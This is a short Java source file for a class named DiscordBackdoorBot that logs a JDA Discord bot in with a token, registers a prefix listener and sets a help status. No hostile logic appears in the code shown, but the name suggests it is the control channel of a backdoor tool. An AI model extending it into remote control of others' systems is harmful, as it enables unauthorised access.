package me.tsb.discordBot;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import javax.security.auth.login.LoginException;

public class DiscordBackdoorBot {

    JDABuilder jdaBuilder;
    String token;
    String activity;
    ListenerAdapter[] listenerAdapters = new ListenerAdapter[]{ new PrefixListner() };

    public JDA bot;
    public static String prefix = "%";


    public DiscordBackdoorBot(String token, String activity) {
        this.token = token;
        this.activity = activity;

        jdaBuilder = JDABuilder.createDefault(this.token);
        jdaBuilder.addEventListeners((Object[]) listenerAdapters);
        jdaBuilder.setActivity(Activity.playing(prefix + "help : " + this.activity));

        try {
            bot = jdaBuilder.build();
            bot.awaitReady();
        }
        catch (LoginException | InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("Bot it booted");
    }
}
